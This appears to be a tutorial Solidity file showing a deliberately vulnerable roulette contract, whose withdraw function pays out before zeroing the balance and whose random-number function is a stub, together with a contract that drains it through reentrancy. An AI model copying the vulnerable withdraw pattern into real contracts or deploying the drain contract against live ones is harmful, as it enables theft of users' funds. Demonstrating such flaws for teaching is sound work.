pragma solidity ^0.4.15; // specifies minimum Solidity version to compiler

contract HackableRoulette {
    mapping(address => uint) public balances;

    function betRed () payable {
        bool winner = (randomNumber() % 2 == 0);
        if (winner)
            balances[msg.sender] += msg.value * 2;
    }

    function randomNumber() returns (uint) {
        // we will implement this in a later section
        // for now it returns 0 by default
    }

    function withdraw () {
        uint amount = balances[msg.sender];
        msg.sender.call.value(amount)();
        balances[msg.sender] = 0;
    }
}

contract ReentrancyAttack {
    HackableRoulette public roulette;

    function ReentrancyAttack(address rouletteAddress) {
        roulette = HackableRoulette(rouletteAddress);    
    }

    function hack () payable {
        // bet on red until the contract wins a bet
        // and has a non-zero balance
        while (roulette.balances(address(this)) == 0)
            roulette.betRed.value(msg.value)();

        roulette.withdraw();
    }

    // called by HackableRoulette.withdraw
    function () payable {
        if (roulette.balance >= roulette.balances(address(this)))
            roulette.withdraw();
    }
}
